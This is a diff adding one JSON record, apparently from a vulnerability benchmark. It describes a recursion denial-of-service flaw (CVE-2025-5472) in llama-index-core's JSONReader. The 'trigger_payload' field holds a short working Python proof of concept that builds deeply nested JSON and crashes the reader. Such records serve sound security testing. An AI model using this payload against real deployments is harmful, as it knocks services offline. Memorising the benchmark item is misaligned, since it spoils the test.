@@ -1,0 +1,15 @@
+{
+  "file_id": "374_llama-index-core_huntr_df187bda-7911-4823-a19a-e15b2c66b0d4",
+  "numeric_id": "374",
+  "library_hint": "llama-index-core",
+  "source": "huntr",
+  "title": "Uncontrolled recursive JSON parsing in JSONReader leads to stack overflow and DoS",
+  "cve": "CVE-2025-5472",
+  "cwe": "CWE-674: Uncontrolled Recursion",
+  "library": "llama_index",
+  "affected_version": "== 0.12.28",
+  "vulnerable_function": "_depth_first_yield",
+  "triggerability": "indirect",
+  "trigger_payload": "from llama_index.readers.json.base import JSONReader\n# 1. Create valid DEEP JSON as a STRING (bypass Python's dict recursion)\ndepth = 1500\njson_str = '{\"nested\": ' * depth + '{}' + '}' * depth\nwith open(\"malicious.json\", \"w\") as f:\n    f.write(json_str) # Direct string write (no json.dump recursion)\n# 2. Now process with JSONReader\nreader = JSONReader(levels_back=2)\ntry:\n    reader.load_data(\"malicious.json\") # Crash happen HERE\nexcept RecursionError as e:\n    print(\"Success! JSONReader crashed due to recursion depth:\", e)",
+  "oracle": "RecursionError is raised, causing the application to crash"
+}
